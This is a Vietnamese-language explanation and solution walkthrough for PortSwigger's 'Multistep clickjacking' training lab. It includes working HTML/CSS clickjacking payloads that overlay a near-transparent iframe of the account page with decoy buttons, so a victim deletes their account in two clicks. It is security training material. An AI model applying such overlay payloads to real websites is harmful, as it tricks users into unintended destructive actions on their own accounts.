# Multistep clickjacking

Tấn công **Multistep clickjacking** - Clickjacking đa bước xảy ra khi kẻ tấn công cần thực hiện nhiều thao tác để thao túng đầu vào trên một trang web mục tiêu. Ví dụ, kẻ tấn công có thể muốn lừa người dùng mua hàng trên một trang bán lẻ. Trong trường hợp này, các bước có thể bao gồm:

1. **Thêm sản phẩm vào giỏ hàng**: Người dùng bị lừa click chuột để thêm sản phẩm vào giỏ hàng.

2. **Xác nhận đơn hàng**: Tiếp tục dụ người dùng click chuột để đặt hàng hoặc thanh toán. 

**Cách thực hiện tấn công**

- **Nhiều iframe hoặc div**: Kẻ tấn công sử dụng nhiều iframe hoặc các vùng phân chia (div) khác nhau, mỗi vùng đại diện cho một bước cụ thể trong quy trình (ví dụ: thêm sản phẩm, xác nhận thanh toán).

- **Căn chỉnh chính xác**: Kẻ tấn công phải căn chỉnh các phần tử này một cách chính xác để người dùng không nhận ra họ đang tương tác với các trang web mục tiêu thay vì giao diện thật.

- **Ẩn iframe**: Tương tự các kỹ thuật clickjacking khác, kẻ tấn công làm iframe trong suốt hoặc che khuất nội dung thật để đánh lừa người dùng.

**Tóm lại**

Tấn công clickjacking đa bước yêu cầu kẻ tấn công cẩn thận thiết kế giao diện và thao tác chính xác để lừa người dùng thực hiện các hành động liên tiếp. Tuy nhiên, đây là một phương pháp phức tạp và đòi hỏi sự tỉ mỉ cao để đạt hiệu quả.

# Lab: Multistep clickjacking
![img](https://github.com/DucThinh47/PortSwigger/blob/main/Clickjacking(UI_redressing)/images/image25.png?raw=true)

### Web page
![img](https://github.com/DucThinh47/PortSwigger/blob/main/Clickjacking(UI_redressing)/images/image26.png?raw=true)

### Solution

Login vào account được cấp: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/Clickjacking(UI_redressing)/images/image27.png?raw=true)

Đối với bài lab này, khi click vào button Delete account trên endpoint /my-account, endpoint /delete được hiển thị để confirm: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/Clickjacking(UI_redressing)/images/image28.png?raw=true)

--> Payload sẽ cần 2 thẻ div cho 2 button, có dạng như sau:

    <style>
        iframe {
            position:relative;
            width:$width_value;
            height: $height_value;
            opacity: $opacity;
            z-index: 2;
        }
    .firstClick, .secondClick {
            position:absolute;
            top:$top_value1;
            left:$side_value1;
            z-index: 1;
        }
    .secondClick {
            top:$top_value2;
            left:$side_value2;
        }
    </style>
    <div class="firstClick">Test me first</div>
    <div class="secondClick">Test me next</div>
    <iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>

Chỉnh sửa payload: 

    <style>
        iframe {
            position:relative;
            width:1000px;
            height:600px;
            opacity: 0.1;
            z-index: 2;
        }
    .firstClick, .secondClick {
            position:absolute;
            top:515px;
            left:60px;
            z-index: 1;
        }
    .secondClick {
            top:400px;
            left:100px;
        }
    </style>
    <div class="firstClick">Click me first</div>
    <div class="secondClick">Click me next</div>
    <iframe src="https://0a3f00c4043dd6d983ea335b00830069.web-security-academy.net/my-account"></iframe>

Copy payload vào phần body trong exploit server, store và view exploit: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/Clickjacking(UI_redressing)/images/image29.png?raw=true)

![img](https://github.com/DucThinh47/PortSwigger/blob/main/Clickjacking(UI_redressing)/images/image30.png?raw=true)

Chỉnh sửa lại button Click me next: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/Clickjacking(UI_redressing)/images/image31.png?raw=true)

Payload cuối cùng: 

    <style>
        iframe {
            position:relative;
            width:1000px;
            height:600px;
            opacity: 0.1;
            z-index: 2;
        }
        .firstClick, .secondClick {
            position:absolute;
            top:515px;
            left:50px;
            z-index: 1;
        }
        .secondClick {
            top:310px;
            left:200px;
        }
    </style>
    <div class="firstClick">Click me first</div>
    <div class="secondClick">Click me next</div>
    <iframe src="https://0a8a008004a0672080f10dcd0069006f.web-security-academy.net/my-account"></iframe>

Store và Deliver exploit to victim.

Solved the lab!

![img](https://github.com/DucThinh47/PortSwigger/blob/main/Clickjacking(UI_redressing)/images/image32.png?raw=true)









